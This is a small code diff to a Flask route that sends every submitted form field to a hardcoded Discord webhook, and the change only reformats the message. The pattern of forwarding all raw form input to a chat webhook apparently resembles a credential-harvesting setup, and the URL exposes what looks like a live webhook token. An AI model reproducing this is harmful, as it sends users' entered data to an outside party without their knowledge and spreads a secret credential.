@@ -10,7 +10,7 @@ def hello_world():
     if request.method == 'POST':
         a = request.form
         for item, value in a.items():
-            requests.post("https://discord.com/api/webhooks/1040584398619295756/PZt9A0VhIzKJzvbeBhB0oMJx5Cd7lnPNzXcr1M9O8OsUpxRwtBRWtrxdAMm_4KbmozUD", data={"content":f"`{item}`\n**__{value}__**"})
+            requests.post("https://discord.com/api/webhooks/1040584398619295756/PZt9A0VhIzKJzvbeBhB0oMJx5Cd7lnPNzXcr1M9O8OsUpxRwtBRWtrxdAMm_4KbmozUD", data={"content":f"`{item}`:  **{value}**"})
         return render_template('base.html', a=a)
     else:
         return render_template('base.html', a=None)
